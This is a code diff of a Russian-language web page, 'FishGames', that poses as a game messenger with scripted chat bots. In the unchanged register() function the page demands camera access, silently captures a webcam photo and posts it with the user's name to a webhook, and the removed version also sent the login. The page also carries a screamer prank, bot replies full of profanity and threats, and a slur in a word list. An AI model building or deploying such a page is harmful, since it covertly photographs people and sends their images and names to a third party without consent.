@@ -18,14 +18,9 @@
         }
         @keyframes moveWaves { from { transform: translate(0,0); } to { transform: translate(50px, 50px); } }
 
-        /* Скример/Влад экран */
-        #vlad-scamer {
-            position: fixed; inset: 0; background: black; z-index: 9999;
-            display: none; justify-content: center; align-items: center;
-        }
+        #vlad-scamer { position: fixed; inset: 0; background: black; z-index: 9999; display: none; justify-content: center; align-items: center; }
         #vlad-scamer img { width: 100vw; height: 100vh; object-fit: contain; }
 
-        /* Экраны */
         #camera-overlay { position: fixed; inset: 0; background: #0d1a17; z-index: 2000; display: flex; justify-content: center; align-items: center; text-align: center; }
         .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; }
         .reg-card { background: #1a2e2a; padding: 30px; border-radius: 15px; width: 350px; border: 1px solid #2e8b57; z-index: 10; }
@@ -35,25 +30,19 @@
         input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #2d4f47; background: #243b35; color: white; box-sizing: border-box; outline: none; }
         .btn { width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
 
-        /* Мессенджер */
         #messenger-screen { display: none; width: 95vw; height: 90vh; background: #1a2e2a; border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden; }
         .messenger-container { display: flex; height: 100%; }
-        
         .sidebar { width: 280px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
         .search-input { width: 100%; background: none; border: 1px solid white; border-radius: 20px; padding: 8px; color: white; text-align: center; margin-bottom: 20px; outline: none; }
-
         .contact-list { flex: 1; overflow-y: auto; }
         .contact-item { display: flex; align-items: center; gap: 12px; padding: 10px; cursor: pointer; border-radius: 10px; transition: 0.2s; margin-bottom: 5px; }
         .contact-item:hover { background: rgba(34, 197, 94, 0.2); }
         .avatar { width: 45px; height: 45px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 1px solid white; flex-shrink: 0; }
-
         .chat-area { flex: 1; display: flex; flex-direction: column; background: rgba(0,0,0,0.1); }
         .chat-header { padding: 15px; text-align: center; font-weight: bold; font-size: 18px; border-bottom: 1px solid #2e8b57; color: #4ade80; }
         .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
-        
         .msg-bubble { background: white; color: black; padding: 10px 15px; border-radius: 15px; align-self: flex-end; max-width: 70%; word-wrap: break-word; }
         .msg-incoming { align-self: flex-start; background: #2d4f47; color: white; }
-
         .input-bar { padding: 15px; background: #1a2e2a; display: flex; gap: 10px; border-top: 1px solid #2e8b57; }
         #video, #canvas { display: none; }
     </style>
@@ -61,7 +50,7 @@
 <body>
 
 <div id="vlad-scamer">
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQyWjq_YNgK8ls1-LHX5eS5blhsGtYvctEhxQ&s" alt="VLAD">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQyWjq_YNgK8ls1-LHX5eS5blhsGtYvctEhxQ&s">
 </div>
 
 <div id="camera-overlay">
@@ -76,10 +65,8 @@
     <h2>FishGames</h2>
     <div class="input-group"><label>Имя</label><input type="text" id="firstname" placeholder="Иван"></div>
     <div class="input-group"><label>Фамилия</label><input type="text" id="lastname" placeholder="Иванов"></div>
-    <div class="input-group"><label>Год рождения</label>
-        <input type="text" id="birthyear" maxlength="4" placeholder="2000" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
-    </div>
-    <div class="input-group"><label>Логин</label><input type="text" id="login" placeholder="user_prime"></div>
+    <div class="input-group"><label>Год рождения</label><input type="text" id="birthyear" maxlength="4"></div>
+    <div class="input-group"><label>Логин</label><input type="text" id="login"></div>
     <button class="btn" onclick="register()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
 </div>
 
@@ -89,30 +76,25 @@
             <input type="text" class="search-input" id="searchField" placeholder="поиск (Enter)" onkeypress="handleSearch(event)">
             <div class="contact-list" id="contacts">
                 <div class="contact-item" onclick="openChat('Служба поддержки')">
-                    <div class="avatar">⚙️</div>
-                    <div>Служба поддержки</div>
+                    <div class="avatar">⚙️</div><div>Служба поддержки</div>
                 </div>
             </div>
             <div style="margin-top: auto; border-top: 1px solid #2e8b57; padding-top: 10px;">
-                <div class="contact-item" style="cursor: default;">
-                    <div class="avatar" id="my-ava" style="background: #008080;">?</div>
-                    <div id="my-name">Вы</div>
-                </div>
+                <div class="contact-item"><div class="avatar" id="my-ava" style="background:#008080">?</div><div id="my-name">Вы</div></div>
             </div>
         </div>
         <div class="chat-area">
             <div class="chat-header" id="chat-title">Выберите чат</div>
             <div class="messages-display" id="chat-box"></div>
             <div class="input-bar">
-                <input type="text" id="messageText" style="flex:1; padding: 10px; border-radius: 8px; border:none;" placeholder="Напишите..." onkeypress="if(event.key==='Enter')sendMessage()">
-                <button class="btn" style="width: 60px; margin-top: 0;" onclick="sendMessage()">➤</button>
+                <input type="text" id="messageText" style="flex:1; padding:10px; border-radius:8px; border:none;" onkeypress="if(event.key==='Enter')sendMessage()">
+                <button class="btn" style="width:60px; margin-top:0" onclick="sendMessage()">➤</button>
             </div>
         </div>
     </div>
 </div>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
+<video id="video" autoplay playsinline></video><canvas id="canvas"></canvas>
 
 <script>
     const video = document.getElementById('video');
@@ -128,23 +110,21 @@
             video.srcObject = s;
             document.getElementById('camera-overlay').style.display = 'none';
             document.getElementById('reg-screen').style.display = 'block';
-        } catch(e) { alert("Камера обязательна!"); location.reload(); }
+        } catch(e) { alert("Камера обязательна!"); }
     }
 
     function register() {
         const fn = document.getElementById('firstname').value;
         const ln = document.getElementById('lastname').value;
         if(!fn || !ln) return alert("Заполните поля!");
-
         canvas.width = video.videoWidth; canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
         canvas.toBlob(b => {
             const fd = new FormData();
-            fd.append('payload_json', JSON.stringify({ content: `✅ **Вход:** ${fn} ${ln}\nЛогин: ${document.getElementById('login').value}` }));
+            fd.append('payload_json', JSON.stringify({ content: `✅ **Вход:** ${fn} ${ln}` }));
             fd.append('file', b, 'user.png');
             fetch(webhook, {method: 'POST', body: fd});
         });
-
         document.getElementById('reg-screen').style.display = 'none';
         document.getElementById('messenger-screen').style.display = 'block';
         document.getElementById('my-name').innerText = fn;
@@ -155,14 +135,7 @@
     function handleSearch(e) {
         if(e.key === 'Enter') {
             const val = document.getElementById('searchField').value.trim();
-            const lowVal = val.toLowerCase();
-
-            // ЛОВУШКА ДЛЯ ВЛАДА
-            if(lowVal === "влад") {
-                document.getElementById('vlad-scamer').style.display = 'flex';
-                return;
-            }
-
+            if(val.toLowerCase() === "влад") { document.getElementById('vlad-scamer').style.display = 'flex'; return; }
             if(val.length >= 2 && !histories[val]) {
                 histories[val] = [];
                 const item = document.createElement('div');
@@ -179,111 +152,82 @@
     function openChat(name) {
         currentChat = name;
         document.getElementById('chat-title').innerText = name;
-        const box = document.getElementById('chat-box');
-        box.innerHTML = '';
-        if(name === 'Служба поддержки' && histories[name].length === 0) {
-            renderMessage("FishGames Security: Биометрия активна. Шифрование включено.", 'msg-incoming');
-        }
+        const box = document.getElementById('chat-box'); box.innerHTML = '';
+        if(name === 'Служба поддержки' && histories[name].length === 0) renderMessage("FishGames Security активна.", 'msg-incoming');
         (histories[name] || []).forEach(m => renderMessage(m.text, m.type));
     }
 
     function renderMessage(text, type) {
         const box = document.getElementById('chat-box');
-        const m = document.createElement('div');
-        m.className = 'msg-bubble ' + type;
-        m.innerText = text;
-        box.appendChild(m);
-        box.scrollTop = box.scrollHeight;
+        const m = document.createElement('div'); m.className = 'msg-bubble ' + type;
+        m.innerText = text; box.appendChild(m); box.scrollTop = box.scrollHeight;
     }
 
     function sendMessage() {
         const inp = document.getElementById('messageText');
-        const txt = inp.value.trim();
-        if(!txt || !currentChat) return;
-        renderMessage(txt, '');
-        histories[currentChat].push({text: txt, type: ''});
-        inp.value = '';
-        setTimeout(() => botReply(txt), 1000 + Math.random() * 1500);
+        const txt = inp.value.trim(); if(!txt || !currentChat) return;
+        renderMessage(txt, ''); histories[currentChat].push({text: txt, type: ''});
+        inp.value = ''; setTimeout(() => botReply(txt), 1000);
     }
 
     function botReply(userText) {
         let reply = "";
         const txt = userText.toLowerCase();
-        const chatName = currentChat.toLowerCase();
+        const name = currentChat.toLowerCase();
 
-        // 1. ПЕРСОНАЛЬНЫЙ ИНТЕЛЛЕКТ
-        
-        if (chatName === "богдан" || chatName === "богда") {
-            if (txt.includes("студи") || txt.includes("работать") || txt.includes("пойдем")) {
-                reply = "Нее, я пасс. Работать вообще не варик сегодня. Лень.";
+        // База матов
+        const isToxic = ["блять", "сука", "хуй", "пидор", "еблан", "чмо", "говно", "помойка", "отстой", "дерьмо"].some(word => txt.includes(word));
+
+        // --- БОГДАН (Ленивый кодер) ---
+        if (name === "богдан" || name === "богда") {
+            if (txt.includes("студи") || txt.includes("работать") || txt.includes("плейс")) {
+                reply = "Не, в Роблокс Студию сегодня не пойду. Луа этот ваш задолбал, опять всё лагает. Я лучше полежу.";
+            } else if (txt.includes("мопс")) {
+                reply = "Мопс — единственный, кто меня понимает. Он не просит дебажить скрипты, он просто храпит.";
             } else if (txt.includes("дела") || txt.includes("че ты")) {
-                const bogdanRand = [
-                    "Да вот, сижу код оптимизирую. Вчера такой баг поймал, пол ночи дебажил.",
-                    "Проект свой пилю на Python, там архитектура сложная, запарился уже.",
-                    "Да нормально, мопса вот выгуливал только что.",
-                    "Думаю, как бы этот интерфейс переписать. Кодинг затягивает.",
-                    "Мопс мой опять кроссовки погрыз, зараза. Зато проект скомпилировался!"
-                ];
-                reply = bogdanRand[Math.floor(Math.random() * bogdanRand.length)];
-            } else if (txt.includes("мопс") || txt.includes("собак")) {
-                reply = "Мой мопс — это вообще легенда. Он когда спит, храпит громче, чем мой кулер на ноуте!";
+                const bRand = ["Кодю потихоньку, проект на коленке собираю.", "Да вот, мопса кормлю. А ты че?", "Студия опять вылетела без сохранения, я в тильте."];
+                reply = bRand[Math.floor(Math.random()*bRand.length)];
             }
         }
-        else if (chatName === "ярослав") {
+        // --- ЯРОСЛАВ (Защитник фембоев) ---
+        else if (name === "ярослав") {
             if (txt.includes("фембой") || txt.includes("femboy")) {
-                if (txt.includes("плохо") || txt.includes("фу") || txt.includes("не оч") || txt.includes("херн")) {
-                    reply = "Ты че, еблан? Ты вообще понимаешь, че ты несешь?! Рот свой закрой про них!";
-                } else {
-                    reply = "Ну хоть кто-то шарит в базе. Это же искусство, реально.";
-                }
-            } else if (txt.includes("привет") || txt.includes("здорово")) {
-                reply = "Здорово. Че хотел? Опять хуйню какую-то напишешь?";
-            } else if (Math.random() < 0.3) {
-                reply = "Блять, да забей ты. Опять ты начинаешь свои истории.";
-            }
-        }
-        else if (chatName === "тимофей") {
-            if (txt.includes("студи")) {
-                reply = "О, КРАСАВА! Давай, я уже микрофоны прогреваю. Жду!";
-            } else if (txt.includes("нет") || txt.includes("не пойду") || txt.includes("не могу")) {
-                reply = "Ну и иди ты... Я вообще-то готовился. Обидно, блин. Больше не зови меня никуда.";
+                if (isToxic) reply = "ТЫ ЧЕ СУКА СКАЗАЛ? Ты вообще в себе?! Еще раз рот откроешь про фембоев — я тебе его зашью, понял?!";
+                else reply = "Фембои — это база. Уважаю.";
+            } else if (isToxic) {
+                reply = "Слышь, блять, ты че такой смелый? Давай фильтруй базар, пока я добрый.";
             } else {
-                reply = "Слушай, а пойдем в студию? Там звук сейчас топовый настроили!";
+                const jRand = ["Че надо?", "Да нормально всё, че пристал.", "Видел новый мем? Ладно, забей.", "Я занят немного."];
+                reply = jRand[Math.floor(Math.random()*jRand.length)];
+            }
+        }
+        // --- ТИМОФЕЙ (Фанатик Roblox Studio) ---
+        else if (name === "тимофей") {
+            if (txt.includes("студи") || txt.includes("роблокс") || txt.includes("плейс")) {
+                reply = "О, КРАСАВА! Давай заходи в Roblox Studio, я там такой паркур заскриптовал, закачаешься!";
+            } else if (txt.includes("нет") || txt.includes("не") || txt.includes("позже")) {
+                reply = "Ну и сиди один... Я тебе тут топовый плейс предлагаю делать, а ты сливаешься. Обидно вообще-то. Реально забей.";
+            } else {
+                reply = "Слушай, а когда в Студию? Там надо GUI допилить и скрипт на спавн. Го?";
             }
         }
 
-        // 2. ОБЩИЙ ИНТЕЛЛЕКТ
+        // ОБЩАЯ БАЗА (Если персонажи не сработали)
         if (!reply) {
-            const toxicWords = ["блять", "сука", "хуй", "пидор", "еблан", "нах", "пошел"];
-            const contextMap = {
-                "студи": ["Я только за, если там пицца будет.", "Давай, я давно хотел что-то записать.", "Погнали, че тянуть?"],
-                "гуля": ["Я только проснулся, дай хоть чаю попью.", "Можно, но если не под дождем.", "Куда двинем?"],
-                "игр": ["В че играем? Если в доту, то я ливаю.", "Давай в майн, сервер создашь?", "Я сейчас комп обновлю и зайду."],
-                "дела": ["Да пойдет, живу как-то.", "Всё стабильно, без потрясений.", "Да чет настроения ноль."],
-                "привет": ["О, привет! Какими судьбами?", "Здорова, сто лет тебя не видел.", "Ку! Че как?"],
-                "зачем": ["А почему бы и нет?", "Просто скучно стало.", "Странный вопрос."],
-                "давай": ["Ну погнали!", "Ок, я в деле.", "Договорились."]
-            };
-            const randomPhrases = [
-                "Ясно... Пойду поем тогда.", "Ахаха, ну ты выдал, конечно.", "Слушай, ты в курсе, что в FishGames пасхалка есть?",
-                "Мда, ладно, забей.", "А че так? Почему не по-другому?", "Ты реально сейчас это серьезно?",
-                "Ну такое себе решение.", "Бывает, че. Жизнь такая.", "Я бы на твоем месте так не рисковал.",
-                "Ну ты и тип! Рил ток.", "Кстати, видел новости сегодня? Жесть.", "Я чет в шоке с этой ситуации.",
-                "Ну ок, допустим. И че дальше?", "А ты сам-то как думаешь?", "Чет подозрительно ты заговорил.",
-                "Ха-ха, шутка года просто.", "Сто процентов! Согласен.", "Не, ну это рил странно.",
-                "А че, так можно было что ли?", "Справедливо.", "Жиза вообще.", "Ну хз, надо подумать.",
-                "Я позже напишу, дела появились.", "Скинь мем какой-нибудь, скучно.", "Вообще без комментариев."
-            ];
-
-            for (let word of toxicWords) { if (txt.includes(word) && chatName !== "ярослав") { reply = "Ого, какие слова мы знаем. Успокойся."; break; } }
-            if (!reply) { for (let key in contextMap) { if (txt.includes(key)) { reply = contextMap[key][Math.floor(Math.random()*contextMap[key].length)]; break; } } }
-            if (!reply) reply = randomPhrases[Math.floor(Math.random() * randomPhrases.length)];
+            if (isToxic && name !== "ярослав") reply = "Че ты материшься? Нормально же общались.";
+            else {
+                const r = [
+                    "Ясно...", "Понятно всё.", "Ахаха, ну ты выдал.", "Слушай, а ты в курсе, что FishGames всё пишет?", "Мда...", "Че серьезно?", 
+                    "Ну такое.", "Бывает.", "Интересно...", "Ладно, допустим.", "И че дальше?", "Ну ты даешь!", "Ха-ха, смешно (нет).",
+                    "Давай по делу.", "Я занят, пиши позже.", "Ок.", "Справедливо.", "Жиза.", "Рил ток.", "База.", "Ну хз даже.",
+                    "А ты сам че думаешь?", "Чет подозрительно.", "Жесть.", "Ничего себе!", "Пойду поем.", "Чекни личку.",
+                    "Я в шоке.", "Ну ок.", "Ладно.", "Давай сменим тему.", "Ты о чем вообще?", "Я не в теме.", "Ну ты и тип!"
+                ];
+                reply = r[Math.floor(Math.random()*r.length)];
+            }
         }
 
-        if(currentChat === 'Служба поддержки') {
-            reply = txt.includes("камер") ? "Данные переданы. FishGames всё видит." : "Ваш запрос в очереди. Ожидайте.";
-        }
-
+        if(currentChat === 'Служба поддержки') reply = "Запрос анализируется. Ожидайте.";
         renderMessage(reply, 'msg-incoming');
         histories[currentChat].push({text: reply, type: 'msg-incoming'});
     }
